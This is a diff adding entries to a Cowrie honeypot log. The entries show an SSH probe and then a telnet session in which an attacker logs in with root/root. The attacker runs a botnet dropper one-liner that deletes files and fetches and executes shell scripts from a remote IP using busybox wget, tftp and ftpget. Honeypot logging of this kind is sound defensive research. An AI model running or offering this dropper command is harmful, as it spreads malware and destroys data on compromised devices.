@@ -1253,3 +1253,30 @@
 2017-03-07T19:50:35+0000 [CowrieTelnetTransport,48468,110.175.63.215] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
 	]
 2017-03-07T19:50:35+0000 [CowrieTelnetTransport,48468,110.175.63.215] Connection lost after 107 seconds
+2017-03-07T19:52:12+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 51.15.55.53:46285 (10.8.41.81:2222) [session: 44d09f6b]
+2017-03-07T19:52:12+0000 [HoneyPotSSHTransport,12339,51.15.55.53] Remote SSH version: SSH-2.0-libssh2_1.6.0
+2017-03-07T19:52:12+0000 [HoneyPotSSHTransport,12339,51.15.55.53] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-03-07T19:52:12+0000 [HoneyPotSSHTransport,12339,51.15.55.53] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-03-07T19:52:12+0000 [HoneyPotSSHTransport,12339,51.15.55.53] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-03-07T19:52:16+0000 [HoneyPotSSHTransport,12339,51.15.55.53] NEW KEYS
+2017-03-07T19:52:16+0000 [HoneyPotSSHTransport,12339,51.15.55.53] starting service 'ssh-userauth'
+2017-03-07T19:52:16+0000 [HoneyPotSSHTransport,12339,51.15.55.53] connection lost
+2017-03-07T19:52:16+0000 [HoneyPotSSHTransport,12339,51.15.55.53] Connection lost after 3 seconds
+2017-03-07T19:52:31+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 59.17.117.201:40421 (10.8.41.81:2223) [session: TT48469]
+2017-03-07T19:52:50+0000 [CowrieTelnetTransport,48469,59.17.117.201] login attempt: 2
+2017-03-07T19:52:50+0000 [CowrieTelnetTransport,48469,59.17.117.201] login return, expect: [root/root]
+2017-03-07T19:52:51+0000 [CowrieTelnetTransport,48469,59.17.117.201] login attempt [root/root] succeeded
+2017-03-07T19:52:53+0000 [CowrieTelnetTransport,48469,59.17.117.201] Opening TTY Log: log/tty/20170307-195253-None-48469i.log
+2017-03-07T19:52:53+0000 [CowrieTelnetTransport,48469,59.17.117.201] Warning: state changed and new state returned
+2017-03-07T19:52:58+0000 [CowrieTelnetTransport,48469,59.17.117.201] CMD: sh
+2017-03-07T19:52:58+0000 [CowrieTelnetTransport,48469,59.17.117.201] Command found: sh 
+2017-03-07T19:52:58+0000 [CowrieTelnetTransport,48469,59.17.117.201] CMD: cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;rm -f *;busybox wget http://5.196.199.238/bin.sh;sh bin.sh;busybox tftp -r bin2.sh -g 5.196.199.238;sh bin2.sh;busybox tftp 5.196.199.238 -c get bin3.sh;sh bin3.sh;busybox ftpget 5.196.199.238 bin4.sh bin4.sh;sh bin4.sh;exit
+2017-03-07T19:52:58+0000 [CowrieTelnetTransport,48469,59.17.117.201] Command found: cd /tmp
+2017-03-07T19:52:58+0000 [CowrieTelnetTransport,48469,59.17.117.201] Command found: cd /var/run
+2017-03-07T19:52:58+0000 [CowrieTelnetTransport,48469,59.17.117.201] Command found: cd /dev/shm
+2017-03-07T19:52:58+0000 [CowrieTelnetTransport,48469,59.17.117.201] Command found: cd /mnt
+2017-03-07T19:52:58+0000 [CowrieTelnetTransport,48469,59.17.117.201] Command found: cd /var
+2017-03-07T19:52:58+0000 [CowrieTelnetTransport,48469,59.17.117.201] Command found: rm -f /var/log /var/run /var/mail /var/tmp /var/opt /var/local /var/backups /var/spool /var/lock /var/lib /var/cache
+2017-03-07T19:52:58+0000 [CowrieTelnetTransport,48469,59.17.117.201] Command found: busybox wget http://5.196.199.238/bin.sh
+2017-03-07T19:52:58+0000 [CowrieTelnetTransport,48469,59.17.117.201] Command found: wget http://5.196.199.238/bin.sh
+2017-03-07T19:52:58+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://5.196.199.238/bin.sh>
